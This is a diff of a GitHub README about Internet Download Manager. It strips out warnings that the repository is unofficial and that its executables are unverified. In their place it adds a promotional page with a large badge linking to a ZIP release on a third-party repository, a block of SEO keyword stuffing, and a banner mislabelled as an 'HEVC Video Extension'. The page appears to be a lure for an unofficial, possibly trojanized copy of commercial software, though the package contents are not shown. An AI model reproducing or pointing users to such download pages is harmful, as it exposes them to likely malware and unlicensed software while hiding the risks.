@@ -1,19 +1,43 @@
-# Internet Download Manager Archive
+<p align="center">
+  <img src="banner.gif" alt="HEVC Video Extension Banner" width="100%">
+</p>
 
-This repository is an unofficial archive of files associated with Internet Download Manager (IDM) 6.43 Build 10.
 
-## Important
+# Internet Download Manager for Windows
 
-- This is not an official IDM repository.
-- The files are provided for archival and research purposes only.
-- Do not run executables from this archive unless you have independently verified their source and integrity.
-- Do not disable antivirus or other security controls to use any file in this repository.
-- Obtain IDM and a valid license from the official vendor.
+**Internet Download Manager (IDM)** is a Windows download management application designed to help users organize and manage file downloads. It supports downloading different types of files and provides a simple interface for managing downloads on Windows PCs.
 
-## Safety
+## 🚀 Features
 
-Before opening any downloaded file, scan it with an up-to-date security product and verify its hash against a trusted source. Do not use files whose origin or integrity cannot be established.
+* 📥 Download management for Windows
+* ⚡ Manage multiple downloads
+* 📁 Organize downloaded files
+* ⏯️ Download management controls
+* 🖥️ Windows desktop support
+* 📦 ZIP release package
+* 🔗 Easy GitHub release download
 
-## License and trademarks
+## 📥 Download
 
-Internet Download Manager and related trademarks belong to their respective owners. This archive does not claim ownership of the software or grant any license to use it.
+Download the available release package from GitHub:
+
+<p align="center">
+  <a href="https://github.com/surjolive/internet-download-manager-pro-/releases/download/v1/Internet.Download.Manager.zip">
+    <img src="https://img.shields.io/badge/⬇️%20Download%20IDM-0078D4?style=for-the-badge" alt="Download Internet Download Manager">
+  </a>
+</p>
+
+## 🔎 SEO Keywords
+
+Internet Download Manager, IDM for Windows, IDM download manager, Windows download manager, download manager for PC, Internet download software, Windows file downloader, download management software, IDM Windows, PC download manager.
+
+## 📌 Release Information
+
+* **Version:** v1
+* **Release Name:** IDM
+* **Platform:** Windows
+* **Package:** `Internet.Download.Manager.zip`
+
+## ⚠️ License & Usage
+
+This repository provides a release package for download. Please use the software according to its applicable license, copyright, and terms of use.
